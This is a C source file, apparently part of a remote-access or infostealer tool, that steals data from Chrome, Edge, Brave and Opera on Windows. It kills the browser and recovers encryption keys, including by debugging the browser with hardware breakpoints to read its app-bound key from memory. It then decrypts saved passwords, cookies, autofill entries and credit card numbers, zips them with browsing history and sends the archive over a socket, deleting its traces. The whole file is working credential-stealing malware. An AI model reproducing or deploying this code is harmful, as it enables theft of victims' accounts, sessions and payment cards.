#include "browser.h"
#include <stdio.h>
#include <tlhelp32.h>
#include <bcrypt.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <winternl.h>
#include <shlwapi.h>
#include "sqlite3.h"
#include "cJSON.h"
#include "miniz.h"
#include "utils.h"

static void extract_from_profile(const char* profile_path, const char* out_dir, const BYTE* v10, const BYTE* v20, const char* temp_prefix, int is_opera);
static BYTE* decrypt_blob(const BYTE* blob, DWORD len, const BYTE* v10_key, const BYTE* v20_key, int is_opera);

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shlwapi.lib")

typedef struct {
    const char* name; const char* process_name; const char* exe_paths[4]; const char* dll_name; const char* user_data_subdir[4];
    const char* output_dir; const char* temp_prefix; int use_r14; int use_roaming; int has_abe;
} BrowserConfig;

static int aes_gcm_decrypt(const BYTE* key, const BYTE* iv, const BYTE* tag, const BYTE* ciphertext, DWORD ciphertext_len, BYTE* plaintext) {
    BCRYPT_ALG_HANDLE hAlg = NULL; BCRYPT_KEY_HANDLE hKey = NULL; BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return 0;
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (BYTE*)key, 32, 0);
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo); authInfo.pbNonce = (BYTE*)iv; authInfo.cbNonce = 12; authInfo.pbTag = (BYTE*)tag; authInfo.cbTag = 16;
    DWORD plain_len = 0; NTSTATUS status = BCryptDecrypt(hKey, (BYTE*)ciphertext, ciphertext_len, &authInfo, NULL, 0, plaintext, ciphertext_len, &plain_len, 0);
    BCryptDestroyKey(hKey); BCryptCloseAlgorithmProvider(hAlg, 0); return status == 0;
}

static BYTE* decrypt_blob(const BYTE* blob, DWORD len, const BYTE* v10_key, const BYTE* v20_key, int is_opera) {
    if (len <= 15) return NULL; BYTE* plain = NULL;
    if (memcmp(blob, "v10", 3) == 0 && len > 15) {
        const BYTE* keys[2] = { v10_key, v20_key };
        for (int i = 0; i < 2; i++) {
            if (!keys[i]) continue; plain = malloc(len - 15 + 1);
            if (aes_gcm_decrypt(keys[i], blob + 3, blob + len - 16, blob + 15, len - 31, plain)) {
                plain[len - 31] = 0; if (is_opera && (len - 31) > 32) { BYTE* final = malloc(len - 31 - 32 + 1); memcpy(final, plain + 32, len - 31 - 32); final[len - 31 - 32] = 0; free(plain); return final; }
                return plain;
            }
            free(plain);
        }
    } else if (memcmp(blob, "v20", 3) == 0 && len > 15) {
        const BYTE* keys[2] = { v20_key, v10_key };
        for (int i = 0; i < 2; i++) {
            if (!keys[i]) continue; plain = malloc(len - 15 + 1);
            if (aes_gcm_decrypt(keys[i], blob + 3, blob + len - 16, blob + 15, len - 31, plain)) {
                plain[len - 31] = 0; if ((len - 31) > 32) { BYTE* final = malloc(len - 31 - 32 + 1); memcpy(final, plain + 32, len - 31 - 32); final[len - 31 - 32] = 0; free(plain); return final; }
                return plain;
            }
            free(plain);
        }
    } else {
        DATA_BLOB in = { len, (BYTE*)blob }, out = { 0, NULL };
        if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) { BYTE* res = malloc(out.cbData + 1); memcpy(res, out.pbData, out.cbData); res[out.cbData] = 0; LocalFree(out.pbData); return res; }
    }
    return NULL;
}

static BYTE* get_v10_key(const char* user_data_dir, DWORD* out_len, int* is_dpapi) {
    char path[MAX_PATH]; _snprintf(path, sizeof(path), "%s\\Local State", user_data_dir);
    FILE* f = fopen(path, "rb"); if (!f) return NULL;
    fseek(f, 0, SEEK_END); long size = ftell(f); fseek(f, 0, SEEK_SET);
    char* buf = malloc(size + 1); fread(buf, 1, size, f); buf[size] = 0; fclose(f);
    cJSON* json = cJSON_Parse(buf); free(buf); if (!json) return NULL;
    cJSON* crypt = cJSON_GetObjectItemCaseSensitive(json, "os_crypt");
    if (!crypt) { cJSON_Delete(json); return NULL; }
    cJSON* enc_key_node = cJSON_GetObjectItemCaseSensitive(crypt, "encrypted_key");
    if (!enc_key_node || !enc_key_node->valuestring) { cJSON_Delete(json); return NULL; }
    size_t enc_len; BYTE* enc_key = base64_decode(enc_key_node->valuestring, (int)strlen(enc_key_node->valuestring), &enc_len);
    cJSON_Delete(json); if (!enc_key) return NULL;
    *is_dpapi = (enc_len >= 5 && memcmp(enc_key, "DPAPI", 5) == 0);
    DATA_BLOB in = { *is_dpapi ? (DWORD)enc_len - 5 : (DWORD)enc_len, *is_dpapi ? enc_key + 5 : enc_key }, out = { 0, NULL };
    if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) { free(enc_key); if (out.cbData == 32) { *out_len = out.cbData; return out.pbData; } LocalFree(out.pbData); }
    else { free(enc_key); } return NULL;
}

static void kill_process(const char* name) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hSnap == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32 pe = { sizeof(pe) };
    if (Process32First(hSnap, &pe)) {
        do { if (_stricmp(pe.szExeFile, name) == 0) { HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID); if (hProc) { TerminateProcess(hProc, 0); CloseHandle(hProc); } } } while (Process32Next(hSnap, &pe));
    }
    CloseHandle(hSnap);
}

static size_t find_target_address(HANDLE hProcess, void* base_addr) {
    IMAGE_DOS_HEADER dos; SIZE_T read; if (!ReadProcessMemory(hProcess, base_addr, &dos, sizeof(dos), &read)) return 0;
    IMAGE_NT_HEADERS64 nt; if (!ReadProcessMemory(hProcess, (BYTE*)base_addr + dos.e_lfanew, &nt, sizeof(nt), &read)) return 0;
    DWORD sec_count = nt.FileHeader.NumberOfSections; IMAGE_SECTION_HEADER* sections = malloc(sizeof(IMAGE_SECTION_HEADER) * sec_count);
    ReadProcessMemory(hProcess, (BYTE*)base_addr + dos.e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + nt.FileHeader.SizeOfOptionalHeader, sections, sizeof(IMAGE_SECTION_HEADER) * sec_count, &read);
    size_t string_va = 0; const char* target = s(SI_BR_MARKER);
    for (DWORD i = 0; i < sec_count; i++) {
        if (memcmp(sections[i].Name, ".rdata", 6) == 0) {
            BYTE* data = malloc(sections[i].Misc.VirtualSize); ReadProcessMemory(hProcess, (BYTE*)base_addr + sections[i].VirtualAddress, data, sections[i].Misc.VirtualSize, &read);
            for (DWORD j = 0; j < (DWORD)(sections[i].Misc.VirtualSize - strlen(target)); j++) { if (memcmp(data + j, target, strlen(target)) == 0) { string_va = (size_t)base_addr + sections[i].VirtualAddress + j; break; } }
            free(data);
        }
        if (string_va) break;
    }
    if (!string_va) { free(sections); return 0; }
    size_t target_addr = 0;
    for (DWORD i = 0; i < sec_count; i++) {
        if (memcmp(sections[i].Name, ".text", 5) == 0) {
            BYTE* data = malloc(sections[i].Misc.VirtualSize); ReadProcessMemory(hProcess, (BYTE*)base_addr + sections[i].VirtualAddress, data, sections[i].Misc.VirtualSize, &read);
            for (DWORD j = 0; j < (DWORD)(sections[i].Misc.VirtualSize - 7); j++) {
                if (data[j] == 0x48 && data[j+1] == 0x8D && data[j+2] == 0x0D) {
                    int offset = *(int*)(data + j + 3); size_t rip = (size_t)base_addr + sections[i].VirtualAddress + j + 7;
                    if (rip + offset == string_va) { target_addr = (size_t)base_addr + sections[i].VirtualAddress + j; break; }
                }
            }
            free(data);
        }
        if (target_addr) break;
    }
    free(sections); return target_addr;
}

static void set_resume_flag(DWORD tid) {
    HANDLE h = OpenThread(THREAD_ALL_ACCESS, FALSE, tid); if (!h) return;
    SuspendThread(h); CONTEXT ctx = { 0 }; ctx.ContextFlags = CONTEXT_CONTROL;
    if (GetThreadContext(h, &ctx)) { ctx.EFlags |= 0x10000; SetThreadContext(h, &ctx); }
    ResumeThread(h); CloseHandle(h);
}

static void clear_hw_bps(DWORD pid) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); if (hSnap == INVALID_HANDLE_VALUE) return;
    THREADENTRY32 te = { sizeof(te) };
    if (Thread32First(hSnap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                HANDLE h = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
                if (h) { SuspendThread(h); CONTEXT ctx = { 0 }; ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
                if (GetThreadContext(h, &ctx)) { ctx.Dr0 = 0; ctx.Dr7 &= ~3; SetThreadContext(h, &ctx); }
                ResumeThread(h); CloseHandle(h); }
            }
        } while (Thread32Next(hSnap, &te));
    }
    CloseHandle(hSnap);
}

static void set_hw_bp(DWORD tid, size_t addr) {
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tid); if (!hThread) return;
    SuspendThread(hThread); CONTEXT ctx = { 0 }; ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (GetThreadContext(hThread, &ctx)) { ctx.Dr0 = addr; ctx.Dr7 = (ctx.Dr7 & ~3) | 1; SetThreadContext(hThread, &ctx); }
    ResumeThread(hThread); CloseHandle(hThread);
}

static void set_hw_bp_all_threads(DWORD pid, size_t addr) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); if (hSnap == INVALID_HANDLE_VALUE) return;
    THREADENTRY32 te = { sizeof(te) };
    if (Thread32First(hSnap, &te)) { do { if (te.th32OwnerProcessID == pid) set_hw_bp(te.th32ThreadID, addr); } while (Thread32Next(hSnap, &te)); }
    CloseHandle(hSnap);
}

static int copy_file(const char* src, const char* dst) {
    FILE *fsrc = fopen(src, "rb"); if (!fsrc) return 0;
    FILE *fdst = fopen(dst, "wb"); if (!fdst) { fclose(fsrc); return 0; }
    char buf[8192]; size_t n; while ((n = fread(buf, 1, sizeof(buf), fsrc)) > 0) fwrite(buf, 1, n, fdst);
    fclose(fsrc); fclose(fdst); return 1;
}

static sqlite3* copy_and_open_db(const char* db_path, const char* temp_prefix, char* out_temp_path) {
    sprintf(out_temp_path, "%s\\%s_%u", getenv("TEMP"), temp_prefix, GetTickCount()); if (!copy_file(db_path, out_temp_path)) return NULL;
    sqlite3* db; if (sqlite3_open(out_temp_path, &db) != SQLITE_OK) { DeleteFileA(out_temp_path); return NULL; } return db;
}

static void extract_history(const char* profile_path, const char* out_dir, const char* temp_prefix) {
    char db_path[MAX_PATH], temp_path[MAX_PATH], out_file[MAX_PATH];
    _snprintf(db_path, sizeof(db_path), "%s\\History", profile_path); _snprintf(out_file, sizeof(out_file), "%s\\history.txt", out_dir);
    sqlite3* db = copy_and_open_db(db_path, temp_prefix, temp_path); if (!db) return;
    sqlite3_stmt* stmt; const char* query = "SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 100";
    if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
        FILE* f = fopen(out_file, "w");
        if (f) { while (sqlite3_step(stmt) == SQLITE_ROW) { fprintf(f, "URL: %s | Title: %s | Visits: %d\n", sqlite3_column_text(stmt, 0), sqlite3_column_text(stmt, 1), sqlite3_column_int(stmt, 2)); } fclose(f); }
        sqlite3_finalize(stmt);
    }
    sqlite3_close(db); DeleteFileA(temp_path);
}

static void extract_autofill(const char* profile_path, const char* out_dir, const BYTE* v10, const BYTE* v20, const char* temp_prefix, int is_opera) {
    char db_path[MAX_PATH], temp_path[MAX_PATH], out_file[MAX_PATH];
    _snprintf(db_path, sizeof(db_path), "%s\\%s", profile_path, s(SI_BR_WEB)); _snprintf(out_file, sizeof(out_file), "%s\\autofill.txt", out_dir);
    sqlite3* db = copy_and_open_db(db_path, temp_prefix, temp_path); if (!db) return;
    FILE* f = fopen(out_file, "w"); if (!f) { sqlite3_close(db); DeleteFileA(temp_path); return; }
    sqlite3_stmt* stmt; if (sqlite3_prepare_v2(db, "SELECT name, value FROM autofill", -1, &stmt, NULL) == SQLITE_OK) { while (sqlite3_step(stmt) == SQLITE_ROW) { fprintf(f, "Form: %s = %s\n", sqlite3_column_text(stmt, 0), sqlite3_column_text(stmt, 1)); } sqlite3_finalize(stmt); }
    if (sqlite3_prepare_v2(db, "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards", -1, &stmt, NULL) == SQLITE_OK) {
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            BYTE* dec = decrypt_blob(sqlite3_column_blob(stmt, 3), sqlite3_column_bytes(stmt, 3), v10, v20, is_opera);
            fprintf(f, "Card: %s | Exp: %d/%d | Num: %s\n", sqlite3_column_text(stmt, 0), sqlite3_column_int(stmt, 1), sqlite3_column_int(stmt, 2), dec ? (char*)dec : "ERR");
            if (dec) free(dec);
        }
        sqlite3_finalize(stmt);
    }
    fclose(f); sqlite3_close(db); DeleteFileA(temp_path);
}

static void extract_passwords(const char* profile_path, const char* out_dir, const BYTE* v10, const BYTE* v20, const char* temp_prefix, int is_opera) {
    char db_path[MAX_PATH], temp_path[MAX_PATH], out_file[MAX_PATH];
    _snprintf(db_path, sizeof(db_path), "%s\\%s", profile_path, s(SI_BR_LOGIN)); _snprintf(out_file, sizeof(out_file), "%s\\passwords.txt", out_dir);
    sqlite3* db = copy_and_open_db(db_path, temp_prefix, temp_path); if (!db) return;
    sqlite3_stmt* stmt; if (sqlite3_prepare_v2(db, "SELECT origin_url, username_value, password_value FROM logins", -1, &stmt, NULL) == SQLITE_OK) {
        FILE* f = fopen(out_file, "w");
        if (f) {
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                BYTE* dec = decrypt_blob(sqlite3_column_blob(stmt, 2), sqlite3_column_bytes(stmt, 2), v10, v20, is_opera);
                if (dec) { fprintf(f, "URL: %s\nUser: %s\nPass: %s\n---\n", sqlite3_column_text(stmt, 0), sqlite3_column_text(stmt, 1), (char*)dec); free(dec); }
            }
            fclose(f);
        }
        sqlite3_finalize(stmt);
    }
    sqlite3_close(db); DeleteFileA(temp_path);
}

static void extract_cookies(const char* profile_path, const char* out_dir, const BYTE* v10, const BYTE* v20, const char* temp_prefix, int is_opera) {
    char db_path[MAX_PATH], temp_path[MAX_PATH], out_file[MAX_PATH];
    _snprintf(db_path, sizeof(db_path), "%s\\%s", profile_path, s(SI_BR_NET_COOKIES)); if (!PathFileExistsA(db_path)) _snprintf(db_path, sizeof(db_path), "%s\\%s", profile_path, s(SI_BR_COOKIES));
    _snprintf(out_file, sizeof(out_file), "%s\\cookies.txt", out_dir);
    sqlite3* db = copy_and_open_db(db_path, temp_prefix, temp_path); if (!db) return;
    sqlite3_stmt* stmt; if (sqlite3_prepare_v2(db, "SELECT host_key, name, value, encrypted_value FROM cookies", -1, &stmt, NULL) == SQLITE_OK) {
        FILE* f = fopen(out_file, "w");
        if (f) {
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                BYTE* dec = decrypt_blob(sqlite3_column_blob(stmt, 3), sqlite3_column_bytes(stmt, 3), v10, v20, is_opera);
                if (dec) { fprintf(f, "Host: %s | Name: %s | Value: %s\n", sqlite3_column_text(stmt, 0), sqlite3_column_text(stmt, 1), (char*)dec); free(dec); }
                else { const char* v = (const char*)sqlite3_column_text(stmt, 2); if (v && strlen(v)>0) fprintf(f, "Host: %s | Name: %s | Value: %s\n", sqlite3_column_text(stmt, 0), sqlite3_column_text(stmt, 1), v); }
            }
            fclose(f);
        }
        sqlite3_finalize(stmt);
    }
    sqlite3_close(db); DeleteFileA(temp_path);
}

static void zip_add_dir(mz_zip_archive* zip, const char* base_path, const char* current_path) {
    char search_path[MAX_PATH]; sprintf(search_path, "%s\\*", current_path); WIN32_FIND_DATAA fd; HANDLE hFind = FindFirstFileA(search_path, &fd); if (hFind == INVALID_HANDLE_VALUE) return;
    do { if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) continue;
        char full_path[MAX_PATH]; sprintf(full_path, "%s\\%s", current_path, fd.cFileName);
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) zip_add_dir(zip, base_path, full_path);
        else { const char* rel_path = full_path + strlen(base_path) + 1; mz_zip_writer_add_file(zip, rel_path, full_path, NULL, 0, MZ_DEFAULT_COMPRESSION); }
    } while (FindNextFileA(hFind, &fd)); FindClose(hFind);
}

static void recursive_delete(const char* path) {
    char search_path[MAX_PATH]; sprintf(search_path, "%s\\*", path); WIN32_FIND_DATAA fd; HANDLE hFind = FindFirstFileA(search_path, &fd);
    if (hFind != INVALID_HANDLE_VALUE) { do { if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) continue; char full_path[MAX_PATH]; sprintf(full_path, "%s\\%s", path, fd.cFileName);
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) recursive_delete(full_path); else DeleteFileA(full_path); } while (FindNextFileA(hFind, &fd)); FindClose(hFind); }
    RemoveDirectoryA(path);
}

static void finish_collection(const BrowserConfig* config, const char* extract_dir, SOCKET sock, HANDLE mutex) {
    mz_zip_archive zip; memset(&zip, 0, sizeof(zip)); if (!mz_zip_writer_init_heap(&zip, 0, 65536)) { sock_send(sock, mutex, "[browser_zip_err]Zip init failed"); recursive_delete(extract_dir); return; }
    zip_add_dir(&zip, extract_dir, extract_dir); void* zip_buf; size_t zip_size; if (!mz_zip_writer_finalize_heap_archive(&zip, &zip_buf, &zip_size)) { sock_send(sock, mutex, "[browser_zip_err]Zip finalize failed"); mz_zip_writer_end(&zip); recursive_delete(extract_dir); return; }
    size_t b64_len; char* b64 = base64_encode(zip_buf, zip_size, &b64_len);
    if (b64) { char msg_prefix[256]; sprintf(msg_prefix, "[browser_zip]%s_collect.zip|", config->name); size_t total_len = strlen(msg_prefix) + b64_len + 2; char* total_msg = malloc(total_len); sprintf(total_msg, "%s%s", msg_prefix, b64); sock_send(sock, mutex, total_msg); free(total_msg); free(b64); }
    else { sock_send(sock, mutex, "[browser_zip_err]Base64 failed"); } mz_zip_writer_end(&zip); recursive_delete(extract_dir);
}

static void extract_from_profile(const char* profile_path, const char* out_dir, const BYTE* v10, const BYTE* v20, const char* temp_prefix, int is_opera) {
    extract_passwords(profile_path, out_dir, v10, v20, temp_prefix, is_opera); extract_cookies(profile_path, out_dir, v10, v20, temp_prefix, is_opera); extract_autofill(profile_path, out_dir, v10, v20, temp_prefix, is_opera); extract_history(profile_path, out_dir, temp_prefix);
}

static void extract_all_profiles(const char* user_data_dir, const char* out_root, const BYTE* v10, const BYTE* v20, const char* temp_prefix, int is_opera) {
    char search_path[MAX_PATH]; sprintf(search_path, "%s\\*", user_data_dir); WIN32_FIND_DATAA fd; HANDLE hFind = FindFirstFileA(search_path, &fd); if (hFind == INVALID_HANDLE_VALUE) return;
    do { if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) { if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) continue; char pref_path[MAX_PATH]; sprintf(pref_path, "%s\\%s\\Preferences", user_data_dir, fd.cFileName);
        if (PathFileExistsA(pref_path)) { char profile_path[MAX_PATH], profile_out[MAX_PATH]; sprintf(profile_path, "%s\\%s", user_data_dir, fd.cFileName); sprintf(profile_out, "%s\\%s", out_root, fd.cFileName); CreateDirectoryA(profile_out, NULL); extract_from_profile(profile_path, profile_out, v10, v20, temp_prefix, is_opera); } } } while (FindNextFileA(hFind, &fd)); FindClose(hFind);
}

void collect_browser_data(const char* browser_name, SOCKET sock, HANDLE mutex) {
    static BrowserConfig configs[] = {
        {"Chrome", "chrome.exe", {"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe", NULL}, "chrome.dll", {NULL}, "chrome_collect", "chrome_tmp", 0, 0, 1},
        {"Edge", "msedge.exe", {"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe", NULL}, "msedge.dll", {NULL}, "edge_collect", "edge_tmp", 1, 0, 1},
        {"Brave", "brave.exe", {"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", "C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", NULL}, "chrome.dll", {NULL}, "brave_collect", "brave_tmp", 0, 0, 1},
        {"Opera", "opera.exe", {NULL}, "launcher_lib.dll", {NULL}, "opera_collect", "opera_tmp", 0, 1, 0},
        {NULL}
    };
    BrowserConfig* config = NULL; for (int i = 0; configs[i].name != NULL; i++) { if (_stricmp(configs[i].name, browser_name) == 0) { config = &configs[i]; break; } }
    if (!config) { sock_send(sock, mutex, "[browser_zip_err]Unknown browser"); return; }
    char user_data[MAX_PATH]; char appdata_env[MAX_PATH]; if (config->use_roaming) GetEnvironmentVariableA("APPDATA", appdata_env, MAX_PATH); else GetEnvironmentVariableA("LOCALAPPDATA", appdata_env, MAX_PATH);
    const char* subdirs[] = {s(SI_BR_CHROME_PATH), s(SI_BR_EDGE_PATH), s(SI_BR_BRAVE_PATH), s(SI_BR_OPERA_PATH)};
    int sub_idx = (config->name[0] == 'C') ? 0 : (config->name[0] == 'E') ? 1 : (config->name[0] == 'B') ? 2 : 3;
    sprintf(user_data, "%s\\%s", appdata_env, subdirs[sub_idx]);
    if (!PathFileExistsA(user_data)) { sock_send(sock, mutex, "[browser_zip_err]User data not found"); return; }
    const char* exe_path = config->exe_paths[0]; // Simplified exe resolution for polymorphic
    kill_process(config->process_name); if (strstr(config->name, "Opera")) kill_process("launcher.exe");
    DWORD v10_len = 0; int is_dpapi = 0; BYTE* v10_key = get_v10_key(user_data, &v10_len, &is_dpapi); int is_opera = strstr(config->name, "Opera") != NULL;
    char extract_root[MAX_PATH]; sprintf(extract_root, "%s\\%s_%u", getenv("TEMP"), config->output_dir, GetTickCount()); CreateDirectoryA(extract_root, NULL);
    if (v10_key && !config->has_abe) { extract_all_profiles(user_data, extract_root, v10_key, is_dpapi ? NULL : v10_key, config->temp_prefix, is_opera); finish_collection(config, extract_root, sock, mutex); LocalFree(v10_key); return; }
    if (!config->has_abe) { sock_send(sock, mutex, "[browser_zip_err]ABE not supported"); recursive_delete(extract_root); if (v10_key) LocalFree(v10_key); return; }
    STARTUPINFO si = { sizeof(si) }; PROCESS_INFORMATION pi = { 0 }; char cmd[MAX_PATH]; sprintf(cmd, "\"%s\" --no-first-run", exe_path);
    if (!CreateProcess(NULL, cmd, NULL, NULL, FALSE, DEBUG_ONLY_THIS_PROCESS | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) { recursive_delete(extract_root); if (v10_key) LocalFree(v10_key); return; }
    DEBUG_EVENT de; size_t target_addr = 0; BYTE v20_key[32]; int success = 0;
    while (WaitForDebugEvent(&de, 10000)) {
        if (de.dwDebugEventCode == LOAD_DLL_DEBUG_EVENT) { char path[MAX_PATH]; if (GetFinalPathNameByHandleA(de.u.LoadDll.hFile, path, MAX_PATH, 0) && strstr(path, config->dll_name)) { target_addr = find_target_address(pi.hProcess, de.u.LoadDll.lpBaseOfDll); if (target_addr) set_hw_bp_all_threads(de.dwProcessId, target_addr); } }
        else if (de.dwDebugEventCode == CREATE_THREAD_DEBUG_EVENT) { if (target_addr) set_hw_bp(de.dwThreadId, target_addr); }
        else if (de.dwDebugEventCode == EXCEPTION_DEBUG_EVENT && de.u.Exception.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP) {
            if ((size_t)de.u.Exception.ExceptionRecord.ExceptionAddress == target_addr) { CONTEXT ctx = { 0 }; ctx.ContextFlags = CONTEXT_FULL; HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, de.dwThreadId); if (hThread && GetThreadContext(hThread, &ctx)) { size_t ptr = config->use_r14 ? ctx.R14 : ctx.R15; BYTE buf[32]; if (ReadProcessMemory(pi.hProcess, (void*)ptr, buf, 32, NULL)) { size_t data_ptr = (*(unsigned long long*)(buf+8) == 32) ? *(size_t*)buf : ptr; if (ReadProcessMemory(pi.hProcess, (void*)data_ptr, v20_key, 32, NULL)) { success = 1; clear_hw_bps(de.dwProcessId); TerminateProcess(pi.hProcess, 0); } } } if (hThread) CloseHandle(hThread); }
            set_resume_flag(de.dwThreadId);
        } else if (de.dwDebugEventCode == EXIT_PROCESS_DEBUG_EVENT) break;
        ContinueDebugEvent(de.dwProcessId, de.dwThreadId, success ? DBG_CONTINUE : DBG_CONTINUE); if (success) break;
    }
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    if (success || v10_key) { extract_all_profiles(user_data, extract_root, v10_key, success ? v20_key : NULL, config->temp_prefix, is_opera); finish_collection(config, extract_root, sock, mutex); }
    if (v10_key) LocalFree(v10_key);
}
